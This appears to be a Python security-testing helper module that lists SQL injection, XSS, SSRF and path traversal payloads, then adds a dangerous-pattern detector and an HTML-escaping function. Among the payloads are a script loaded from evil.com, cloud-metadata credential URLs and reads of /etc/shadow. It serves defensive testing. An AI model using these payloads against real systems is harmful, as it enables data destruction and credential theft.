"""
Security Test Payloads

安全测试用的注入 payload 和验证工具

@module tests.integration.staging.helpers.security
"""

from typing import List, Dict, Any


# ==========================================
# SQL Injection Payloads
# ==========================================

SQL_INJECTION_PAYLOADS: List[str] = [
    # Basic injection
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "' OR ''='",
    "1; SELECT * FROM profiles",

    # Union-based injection
    "' UNION SELECT * FROM users--",
    "' UNION SELECT username, password FROM users--",
    "1' UNION SELECT null, null, null--",

    # Error-based injection
    "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",

    # Time-based blind injection
    "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",

    # Stacked queries
    "1; INSERT INTO users VALUES('hacker', 'password')--",
    "1; UPDATE users SET password='hacked' WHERE username='admin'--",

    # Comment injection
    "admin'--",
    "admin'/*",
    "*/OR/**/1=1--",

    # PostgreSQL specific
    "'; SELECT pg_sleep(5);--",
    "1; SELECT version();--",
]

# Shorter list for quick tests
SQL_INJECTION_QUICK: List[str] = [
    "'; DROP TABLE users; --",
    "1' OR '1'='1",
    "' UNION SELECT * FROM users--",
]


# ==========================================
# XSS Injection Payloads
# ==========================================

XSS_PAYLOADS: List[str] = [
    # Basic script tags
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script src='https://evil.com/xss.js'></script>",

    # Event handlers
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<div onmouseover=alert('XSS')>hover</div>",

    # JavaScript protocol
    "javascript:alert('XSS')",
    "<a href='javascript:alert(1)'>click</a>",

    # Data URI
    "<a href='data:text/html,<script>alert(1)</script>'>click</a>",

    # Encoded payloads
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",

    # Breaking out of attributes
    "'><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "' onclick=alert('XSS') '",

    # CSS injection
    "<style>body{background:url('javascript:alert(1)')}</style>",

    # SVG-based XSS
    "<svg><script>alert('XSS')</script></svg>",
    "<svg/onload=alert('XSS')>",
]

# Shorter list for quick tests
XSS_QUICK: List[str] = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
]


# ==========================================
# SSRF Test URLs
# ==========================================

SSRF_PAYLOADS: List[str] = [
    # Localhost variants
    "http://localhost/admin",
    "http://localhost:8080/api",
    "http://127.0.0.1/admin",
    "http://127.0.0.1:22/",
    "http://[::1]/admin",
    "http://0.0.0.0/admin",

    # Private IP ranges
    "http://192.168.1.1/",
    "http://192.168.0.1/router",
    "http://10.0.0.1/internal",
    "http://172.16.0.1/admin",

    # Cloud metadata endpoints
    "http://169.254.169.254/latest/meta-data/",  # AWS
    "http://169.254.169.254/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/instance",  # Azure

    # File protocol
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///proc/self/environ",

    # Alternative encodings
    "http://0x7f.0x00.0x00.0x01/",  # Hex encoded 127.0.0.1
    "http://2130706433/",  # Decimal encoded 127.0.0.1
    "http://017700000001/",  # Octal encoded 127.0.0.1

    # DNS rebinding
    "http://localtest.me/",
    "http://spoofed.burpcollaborator.net/",
]

# Cloud metadata only
SSRF_CLOUD_METADATA: List[str] = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
]


# ==========================================
# Path Traversal Payloads
# ==========================================

PATH_TRAVERSAL_PAYLOADS: List[str] = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "....//....//....//....//etc/passwd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
]


# ==========================================
# Boundary Test Strings
# ==========================================

def get_boundary_strings() -> Dict[str, str]:
    """获取边界测试字符串"""
    return {
        "empty": "",
        "whitespace_only": "   ",
        "single_char": "x",
        "long_100": "x" * 100,
        "long_200": "x" * 200,
        "long_500": "x" * 500,
        "long_1000": "x" * 1000,
        "long_5000": "x" * 5000,
        "long_10000": "x" * 10000,
        "unicode_chinese": "测试中文内容",
        "unicode_emoji": "🎉🚀💡✨",
        "unicode_mixed": "Test 测试 🎉 émoji",
        "special_chars": "!@#$%^&*()_+-=[]{}|;':\",./<>?",
        "newlines": "line1\nline2\rline3\r\nline4",
        "tabs": "col1\tcol2\tcol3",
        "null_byte": "test\x00string",
        "backslash": "path\\to\\file",
        "quotes": "\"quoted\" and 'single'",
    }


def get_numeric_boundaries() -> Dict[str, Any]:
    """获取数值边界测试值"""
    return {
        "zero": 0,
        "negative_one": -1,
        "negative_large": -999999999,
        "one": 1,
        "max_int32": 2147483647,
        "min_int32": -2147483648,
        "max_int64": 9223372036854775807,
        "float_zero": 0.0,
        "float_small": 0.0001,
        "float_large": 999999.99,
        "float_negative": -0.01,
    }


# ==========================================
# Security Validation Helpers
# ==========================================

def is_potentially_dangerous(text: str) -> bool:
    """
    检查文本是否包含潜在危险内容

    用于验证响应是否正确过滤了危险输入
    """
    dangerous_patterns = [
        "<script",
        "javascript:",
        "onerror=",
        "onload=",
        "onclick=",
        "DROP TABLE",
        "SELECT *",
        "UNION SELECT",
        "INSERT INTO",
        "DELETE FROM",
        "UPDATE ",
        "../",
        "file://",
        "169.254.169.254",
    ]
    text_lower = text.lower()
    return any(pattern.lower() in text_lower for pattern in dangerous_patterns)


def sanitize_for_display(text: str, max_length: int = 100) -> str:
    """
    为显示目的净化文本

    截断并转义危险字符
    """
    if len(text) > max_length:
        text = text[:max_length] + "..."
    # 转义 HTML 特殊字符
    text = (
        text.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#x27;")
    )
    return text
